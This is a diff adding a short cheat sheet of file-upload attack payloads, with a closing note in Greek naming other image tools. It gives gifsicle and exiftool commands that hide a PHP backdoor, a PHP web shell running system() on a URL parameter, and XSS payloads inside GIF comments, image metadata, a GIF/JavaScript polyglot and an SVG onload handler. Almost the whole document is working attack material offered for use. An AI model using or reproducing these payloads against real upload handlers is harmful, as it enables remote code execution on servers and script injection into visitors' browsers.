@@ -1,0 +1,15 @@
+## gifsicle commant to invoke payload into .gif
+ 
+gifsicle --comment "` tr '\n' ' ' < backdoor.php `" < file.gif > output_out.gif
+ 
+gifsicle --comment "<?php echo 'HACKED' ?>" < file.gif > output_out.gif 
+ 
+exiftool -Artist=’ “><img src=1 onerror=alert(document.domain)>’ brute.jpeg
+                    <?php system($_GET['vap0r']) ?>
+ 
+GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//; > name it test.gif 
+ 
+<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
+
+ 
+Αλλα εργαλεια για νορμαλ εικονες (οχι gif) ειναι το jhead + exiftool
